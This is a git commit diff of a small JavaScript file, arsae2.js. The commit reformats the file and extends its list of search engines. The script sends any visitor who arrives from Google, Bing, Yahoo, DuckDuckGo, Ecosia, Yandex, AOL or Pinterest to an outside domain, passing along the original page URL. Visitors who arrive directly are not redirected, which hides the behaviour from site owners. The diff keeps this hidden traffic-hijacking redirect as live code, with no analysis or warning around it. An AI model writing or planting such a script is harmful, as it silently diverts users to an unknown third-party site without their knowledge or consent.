36313b454c8b0f67d7f59f6b38987eda834623a2
ajapadam <89146191+ajapadam@users.noreply.github.com>
2022-04-23 00:56:28 +0700

    Update arsae2.js

--- arsae2.js
+++ arsae2.js
@@ -1,11 +1,12 @@
-//<![CDATA[
     if(document.referrer)
     {
     	var cek = document.referrer;
 
-    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('.yahoo.') || cek.includes('.aol.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('pinterest.');
-      if(is_se)    	{    		var url = window.location.href;    		window.location = "https://fatinsl.info/?arsae="+
- encodeURIComponent(url);
+    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('ecosia.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('.yahoo.') || cek.includes('aol.') || cek.includes('pinterest.');
+
+      if(is_se)
+    	{
+    		var url = window.location.href;
+    		window.location = "https://fatinsl.info/?arsae="+ encodeURIComponent(url);
     	}
     }
-//]]>
